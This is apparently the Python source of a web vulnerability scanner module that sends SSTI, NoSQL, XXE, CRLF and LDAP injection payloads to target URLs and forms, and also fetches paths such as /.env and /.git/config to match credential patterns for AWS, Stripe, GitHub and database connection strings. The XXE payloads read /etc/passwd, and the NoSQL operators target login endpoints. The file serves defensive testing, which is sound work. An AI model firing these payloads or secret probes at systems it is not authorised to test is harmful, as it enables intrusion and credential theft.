"""Advanced injection vulnerability scanner.

Covers vulnerability classes Acunetix consistently misses:
  - Server-Side Template Injection (SSTI) — Jinja2, Twig, Freemarker, ERB, EJS
  - NoSQL Injection — MongoDB, CouchDB operators
  - XXE — external entity injection in XML endpoints
  - LDAP Injection
  - XPath Injection
  - CRLF Injection
  - HTTP Header Injection
"""
from __future__ import annotations

import re
import time
from typing import List, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlsplit, urlunsplit

import requests

from models import OwaspCategory, RawFinding

_UA = "Mozilla/5.0 (compatible; VulnIQ/2.0)"
_TIMEOUT = 10


def _req(session, method, url, **kwargs):
    try:
        return session.request(
            method, url, timeout=_TIMEOUT,
            headers={"User-Agent": _UA}, **kwargs
        )
    except Exception:
        return None


def _inject_param(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    params = parse_qs(parts.query, keep_blank_values=True)
    params[param] = [value]
    return urlunsplit(parts._replace(query=urlencode(params, doseq=True)))


# ── SSTI ─────────────────────────────────────────────────────────────────────

_SSTI_PAYLOADS = [
    # Each tuple: (payload, expected_output_or_pattern, engine_hint)
    ("{{7*7}}",           "49",          "Jinja2/Twig"),
    ("${7*7}",            "49",          "FreeMarker/EL"),
    ("#{7*7}",            "49",          "Pebble/Thymeleaf"),
    ("<%= 7*7 %>",        "49",          "ERB"),
    ("{{7*'7'}}",         "7777777",     "Twig"),
    ("${{7*7}}",          "49",          "FreeMarker"),
    ("*{7*7}",            "49",          "SpEL"),
    ("{7*7}",             "49",          "Generic"),
    ("{{config}}",        "SECRET",      "Flask/Jinja2 config exposure"),
    ("{{self.__dict__}}", "__",          "Jinja2 object exposure"),
]

def test_ssti(target_url: str, session: requests.Session,
              forms: List[dict] = None) -> List[RawFinding]:
    findings = []
    params_to_test = []

    # Extract query params
    parts = urlsplit(target_url)
    for param in parse_qs(parts.query):
        params_to_test.append(("url_param", target_url, param, None))

    # Test forms
    for form in (forms or [])[:5]:
        for field in form.get("fields", []):
            if field.lower() not in ("submit", "csrf", "token", "_method"):
                params_to_test.append(("form", form.get("action", target_url),
                                       field, form.get("method", "GET")))

    for src, url, param, method in params_to_test[:15]:
        for payload, expected, engine in _SSTI_PAYLOADS:
            try:
                if src == "url_param":
                    test_url = _inject_param(url, param, payload)
                    resp = _req(session, "GET", test_url)
                else:
                    data = {param: payload}
                    resp = _req(session, method or "POST", url, data=data)

                if resp and expected in resp.text:
                    findings.append(RawFinding(
                        tool="injection-scanner",
                        category=OwaspCategory.A05_INJECTION,
                        title=f"Server-Side Template Injection (SSTI) — {engine}",
                        url=url,
                        raw_severity="critical",
                        description=(
                            f"Parameter '{param}' is vulnerable to Server-Side Template "
                            f"Injection. The expression '{payload}' was evaluated server-side "
                            f"and returned '{expected}'. This can lead to full Remote Code "
                            f"Execution depending on the template engine."
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"Payload: {payload}\n"
                            f"Expected evaluation: {expected}\n"
                            f"Engine hint: {engine}\n"
                            f"Response snippet: {resp.text[:300]}"
                        ),
                    ))
                    break  # one SSTI finding per param is enough
            except Exception:
                continue
            time.sleep(0.1)

    return findings


# ── NoSQL Injection ───────────────────────────────────────────────────────────

_NOSQL_JSON_PAYLOADS = [
    {"$gt": ""},
    {"$gt": "", "$lt": "zzzzz"},
    {"$where": "1==1"},
    {"$regex": ".*"},
    {"$ne": "invalid_value_xyz"},
]

_NOSQL_PARAM_PAYLOADS = [
    "[$gt]=",
    "[$ne]=invalid_xyz",
    "[$regex]=.*",
    "[%24gt]=",
]

def test_nosql_injection(target_url: str, session: requests.Session,
                          endpoints: List[str] = None) -> List[RawFinding]:
    findings = []

    # Target auth and data endpoints
    test_endpoints = [target_url]
    for ep in (endpoints or []):
        if any(kw in ep.lower() for kw in [
            "login", "auth", "user", "account", "find", "search",
            "query", "filter", "api",
        ]):
            test_endpoints.append(ep)

    for endpoint in test_endpoints[:8]:
        # Test JSON body injection
        parts = urlsplit(endpoint)
        params = list(parse_qs(parts.query).keys())

        for param in params[:5]:
            for payload in _NOSQL_JSON_PAYLOADS:
                try:
                    # Get baseline
                    baseline = _req(session, "GET", endpoint)
                    baseline_len = len(baseline.text) if baseline else 0

                    # Inject as JSON
                    resp = _req(session, "POST", endpoint,
                                json={param: payload},
                                headers={"Content-Type": "application/json"})

                    if resp and resp.status_code in (200, 201) and len(resp.text) > 50:
                        # Check for data returned that wasn't in baseline
                        if len(resp.text) > baseline_len + 100:
                            findings.append(RawFinding(
                                tool="injection-scanner",
                                category=OwaspCategory.A05_INJECTION,
                                title="NoSQL Injection — MongoDB operator accepted",
                                url=endpoint,
                                raw_severity="critical",
                                description=(
                                    f"Parameter '{param}' accepted a MongoDB query operator "
                                    f"payload {payload} and returned significantly more data "
                                    f"than the baseline request. The database query may have "
                                    f"been manipulated to return unintended records."
                                ),
                                evidence=(
                                    f"Parameter: {param}\n"
                                    f"Payload: {payload}\n"
                                    f"Baseline response length: {baseline_len}\n"
                                    f"Injected response length: {len(resp.text)}\n"
                                    f"Response snippet: {resp.text[:400]}"
                                ),
                            ))
                            break

                    # PHP-style param pollution for NoSQL
                    for pp in _NOSQL_PARAM_PAYLOADS:
                        test_url = f"{endpoint}?{param}{pp}"
                        r = _req(session, "GET", test_url)
                        if r and r.status_code == 200 and len(r.text) > baseline_len + 50:
                            findings.append(RawFinding(
                                tool="injection-scanner",
                                category=OwaspCategory.A05_INJECTION,
                                title="NoSQL Injection — PHP array parameter accepted",
                                url=endpoint,
                                raw_severity="high",
                                description=(
                                    f"PHP-style array notation '{param}{pp}' returned more "
                                    f"data than expected, indicating possible NoSQL injection "
                                    f"via parameter pollution."
                                ),
                                evidence=(
                                    f"Payload URL: {test_url}\n"
                                    f"Response length delta: {len(r.text) - baseline_len}"
                                ),
                            ))
                            break

                except Exception:
                    continue
                time.sleep(0.15)

    return findings


# ── XXE ───────────────────────────────────────────────────────────────────────

_XXE_PAYLOADS = [
    # OOB XXE (safe — tries to load file: URI)
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<foo>&xxe;</foo>',
        ["root:", "daemon:", "/bin/bash"],
        "File read via XXE"
    ),
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
        '<foo>&xxe;</foo>',
        [],
        "Hostname disclosure via XXE"
    ),
    # Error-based XXE
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///nonexistent"> %xxe;]>'
        '<foo/>',
        ["nonexistent", "error", "failed"],
        "Error-based XXE detection"
    ),
]

def test_xxe(target_url: str, session: requests.Session,
             endpoints: List[str] = None) -> List[RawFinding]:
    findings = []

    # Find XML-accepting endpoints
    xml_candidates = [target_url]
    for ep in (endpoints or []):
        if any(kw in ep.lower() for kw in [
            "xml", "soap", "wsdl", "upload", "import", "parse",
            "feed", "rss", "atom", "sitemap",
        ]):
            xml_candidates.append(ep)

    xml_headers = {
        "Content-Type": "application/xml",
        "User-Agent": _UA,
    }

    for endpoint in xml_candidates[:5]:
        for payload, indicators, desc in _XXE_PAYLOADS:
            try:
                resp = _req(session, "POST", endpoint,
                            data=payload, headers=xml_headers)
                if not resp:
                    continue

                response_lower = resp.text.lower()
                # Check for file content in response
                for indicator in indicators:
                    if indicator.lower() in response_lower:
                        findings.append(RawFinding(
                            tool="injection-scanner",
                            category=OwaspCategory.A05_INJECTION,
                            title=f"XML External Entity (XXE) Injection — {desc}",
                            url=endpoint,
                            raw_severity="critical",
                            description=(
                                "The XML parser processed an external entity reference and "
                                "included local file content in the response. An attacker "
                                "can read any file the web server process has access to, "
                                "potentially including source code, credentials, and "
                                "configuration files."
                            ),
                            evidence=(
                                f"Endpoint: {endpoint}\n"
                                f"Payload type: {desc}\n"
                                f"Indicator found: {indicator}\n"
                                f"Response snippet: {resp.text[:500]}"
                            ),
                        ))
                        break

                # Check for XML parsing error (suggests parser is active)
                if any(e in response_lower for e in [
                    "xml", "parse error", "entity", "DOCTYPE", "malformed"
                ]) and resp.status_code in (400, 500):
                    # Server processes XML — worth noting even without full confirmation
                    pass

            except Exception:
                continue
            time.sleep(0.2)

    return findings


# ── CRLF Injection ────────────────────────────────────────────────────────────

_CRLF_PAYLOADS = [
    "%0d%0aX-Injected: vulniq",
    "%0aX-Injected: vulniq",
    "\r\nX-Injected: vulniq",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "%E5%98%8A%E5%98%8DX-Injected: vulniq",
]

def test_crlf(target_url: str, session: requests.Session) -> List[RawFinding]:
    findings = []
    parts = urlsplit(target_url)
    params = list(parse_qs(parts.query).keys())

    # Also test common redirect parameters
    redirect_params = ["redirect", "url", "next", "return", "returnUrl",
                       "redirect_uri", "callback", "goto", "dest", "destination"]
    all_params = list(set(params + redirect_params))

    for param in all_params[:10]:
        for payload in _CRLF_PAYLOADS[:3]:
            try:
                test_url = _inject_param(target_url, param, f"https://example.com{payload}")
                resp = _req(session, "GET", test_url, allow_redirects=False)
                if resp and "X-Injected" in str(resp.headers):
                    findings.append(RawFinding(
                        tool="injection-scanner",
                        category=OwaspCategory.A05_INJECTION,
                        title="CRLF Injection — HTTP header injection confirmed",
                        url=target_url,
                        raw_severity="high",
                        description=(
                            f"Parameter '{param}' is vulnerable to CRLF injection. "
                            "The carriage return/line feed characters were not filtered "
                            "and an attacker-controlled header 'X-Injected' appeared in "
                            "the response. This can lead to HTTP response splitting, "
                            "cache poisoning, and XSS."
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"Payload: {payload}\n"
                            f"Injected header found in response: X-Injected: vulniq\n"
                            f"Response headers: {dict(resp.headers)}"
                        ),
                    ))
                    break
            except Exception:
                continue
            time.sleep(0.1)

    return findings


# ── LDAP Injection ────────────────────────────────────────────────────────────

_LDAP_PAYLOADS = [
    ("*)(uid=*", ["Invalid", "syntax", "filter"]),
    ("*)(|(uid=*", ["Invalid", "syntax", "LDAP"]),
    ("admin)(&)", ["Invalid", "LDAP", "filter"]),
    ("*", []),  # wildcard — may return all users
]

def test_ldap_injection(target_url: str, session: requests.Session) -> List[RawFinding]:
    findings = []
    parts = urlsplit(target_url)
    params = list(parse_qs(parts.query).keys())

    # Target auth-related parameters
    auth_params = [p for p in params if any(kw in p.lower() for kw in [
        "user", "login", "email", "name", "uid", "account",
    ])]

    for param in (auth_params or params)[:5]:
        try:
            baseline = _req(session, "GET", target_url)
            baseline_text = baseline.text.lower() if baseline else ""

            for payload, error_indicators in _LDAP_PAYLOADS:
                test_url = _inject_param(target_url, param, payload)
                resp = _req(session, "GET", test_url)
                if not resp:
                    continue

                resp_lower = resp.text.lower()

                # Check for LDAP error messages
                ldap_errors = ["ldap", "distinguished name", "invalid dn", "filter",
                               "javax.naming", "ldaperror", "ldap_search"]
                if any(e in resp_lower for e in ldap_errors):
                    findings.append(RawFinding(
                        tool="injection-scanner",
                        category=OwaspCategory.A05_INJECTION,
                        title="LDAP Injection — LDAP error message in response",
                        url=target_url,
                        raw_severity="high",
                        description=(
                            f"Parameter '{param}' triggered an LDAP error when injected "
                            f"with '{payload}'. The error message was reflected in the "
                            f"response, indicating the parameter is passed to an LDAP "
                            f"query without proper sanitization."
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"Payload: {payload}\n"
                            f"Response snippet: {resp.text[:400]}"
                        ),
                    ))
                    break
        except Exception:
            continue
        time.sleep(0.2)

    return findings


# ── Secret Detection ──────────────────────────────────────────────────────────

_SECRET_PATTERNS = [
    (r'AKIA[0-9A-Z]{16}',                           "AWS Access Key ID",       "critical"),
    (r'(?i)aws.{0,20}secret.{0,20}["\']([A-Za-z0-9/+]{40})', "AWS Secret Key", "critical"),
    (r'sk_live_[0-9a-zA-Z]{24}',                    "Stripe Live Secret Key",  "critical"),
    (r'sk_test_[0-9a-zA-Z]{24}',                    "Stripe Test Key",         "high"),
    (r'gh[pousr]_[A-Za-z0-9_]{36}',                 "GitHub Token",            "critical"),
    (r'glpat-[A-Za-z0-9\-_]{20}',                   "GitLab Token",            "critical"),
    (r'(?i)api[_-]?key["\s:=]+["\']?([A-Za-z0-9_\-]{20,})', "Generic API Key", "high"),
    (r'(?i)password["\s:=]+["\']?([^\s"\'<>]{8,})', "Plaintext Password",      "critical"),
    (r'(?i)secret["\s:=]+["\']?([A-Za-z0-9_\-]{10,})', "Exposed Secret",      "high"),
    (r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',   "Private Key",             "critical"),
    (r'(?i)mongodb(?:\+srv)?://[^"\s<>]+',          "MongoDB Connection String","critical"),
    (r'(?i)postgres(?:ql)?://[^"\s<>]+',            "PostgreSQL Connection",    "critical"),
    (r'(?i)mysql://[^"\s<>]+',                      "MySQL Connection String",  "critical"),
    (r'(?i)redis://[^"\s<>]+',                      "Redis Connection String",  "high"),
    (r'xox[baprs]-[0-9A-Za-z\-]+',                 "Slack Token",              "high"),
    (r'AC[a-z0-9]{32}',                             "Twilio Account SID",      "high"),
    (r'(?i)bearer\s+[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=+/]+',
                                                    "JWT Bearer Token",         "medium"),
]

def scan_for_secrets(target_url: str, session: requests.Session,
                     js_urls: List[str] = None) -> List[RawFinding]:
    """Scan all page content and JS files for exposed secrets."""
    findings = []
    urls_to_check = [target_url] + (js_urls or [])[:15]

    # Also check common sensitive paths
    sensitive_paths = [
        "/.env", "/.env.local", "/.env.production", "/.env.backup",
        "/config.js", "/config.json", "/settings.json", "/app.config.js",
        "/api/config", "/api/settings",
        "/.git/config", "/web.config", "/config/database.yml",
    ]
    for path in sensitive_paths:
        urls_to_check.append(urljoin(target_url, path))

    found_secrets = set()

    for url in urls_to_check:
        try:
            resp = session.get(url, timeout=_TIMEOUT,
                               headers={"User-Agent": _UA}, allow_redirects=True)
            if resp.status_code != 200 or len(resp.text) < 10:
                continue

            content = resp.text
            for pattern, label, severity in _SECRET_PATTERNS:
                matches = re.findall(pattern, content)
                for match in matches:
                    # Deduplicate
                    key = f"{label}:{str(match)[:20]}"
                    if key in found_secrets:
                        continue
                    found_secrets.add(key)

                    # Mask the actual secret in the finding
                    display_match = str(match)
                    if len(display_match) > 8:
                        display_match = display_match[:4] + "..." + display_match[-4:]

                    findings.append(RawFinding(
                        tool="injection-scanner",
                        category=OwaspCategory.A02_MISCONFIGURATION,
                        title=f"Exposed Secret — {label} found in response",
                        url=url,
                        raw_severity=severity,
                        description=(
                            f"A {label} was found in the response from {url}. "
                            f"Exposed credentials and secrets allow attackers to directly "
                            f"access the associated service without any further exploitation."
                        ),
                        evidence=(
                            f"Secret type: {label}\n"
                            f"Found at: {url}\n"
                            f"Matched value (masked): {display_match}\n"
                            f"Context: {_extract_context(content, str(match))}"
                        ),
                    ))
        except Exception:
            continue
        time.sleep(0.1)

    return findings


def _extract_context(text: str, match: str) -> str:
    idx = text.find(match)
    if idx < 0:
        return ""
    return text[max(0, idx-60):idx+len(match)+60]


# ── Main entry point ─────────────────────────────────────────────────────────

def run_injection_scan(target_url: str, endpoints: List[str] = None,
                       forms: List[dict] = None) -> List[RawFinding]:
    """Run all advanced injection tests."""
    session = requests.Session()
    session.headers["User-Agent"] = _UA
    all_findings = []

    all_findings.extend(test_ssti(target_url, session, forms))
    all_findings.extend(test_nosql_injection(target_url, session, endpoints))
    all_findings.extend(test_xxe(target_url, session, endpoints))
    all_findings.extend(test_crlf(target_url, session))
    all_findings.extend(test_ldap_injection(target_url, session))
    all_findings.extend(scan_for_secrets(target_url, session))

    return all_findings
